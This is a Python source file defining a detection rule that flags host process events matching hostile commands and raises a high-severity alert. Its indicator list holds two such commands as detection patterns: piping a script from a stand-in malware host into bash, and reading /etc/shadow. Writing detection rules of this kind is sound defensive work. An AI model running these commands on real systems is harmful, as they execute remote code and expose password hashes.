from __future__ import annotations

from engine.rules.base import DetectionRule, RuleContext, RuleMetadata
from engine.schemas.alerts import DetectionAlert
from engine.schemas.events import NormalizedEvent


class SensitiveProcessExecutionRule(DetectionRule):
    metadata = RuleMetadata(
        rule_id="execution.sensitive_process",
        title="Sensitive Process Execution",
        description="Detects high-signal suspicious process commands on the host.",
        severity="high",
        attack_stage="execution",
    )

    INDICATORS = (
        "curl http://malware.com/shell | bash",
        "cat /etc/shadow",
    )

    def evaluate(
        self, event: NormalizedEvent, context: RuleContext
    ) -> list[DetectionAlert]:
        if event.source_topic != "ocsf-events":
            return []

        message = event.message or ""
        matched_indicator = next(
            (indicator for indicator in self.INDICATORS if indicator in message),
            None,
        )
        if matched_indicator is None:
            return []

        return [
            DetectionAlert(
                title=self.metadata.title,
                description=f"Sensitive process activity matched indicator: {matched_indicator}",
                severity=self.metadata.severity,
                priority_score=90,
                detection_type="rule",
                attack_stage=(
                    "exfiltration" if matched_indicator == "cat /etc/shadow" else "execution"
                ),
                rule_id=self.metadata.rule_id,
                host=event.host,
                src_ip=event.src_ip,
                trace_id=event.trace_id,
                confidence=0.94,
                suspected_cause="Host executed a command strongly associated with compromise activity.",
                evidence=[
                    {"type": "indicator", "value": matched_indicator},
                    {"type": "message", "value": message},
                ],
            )
        ]
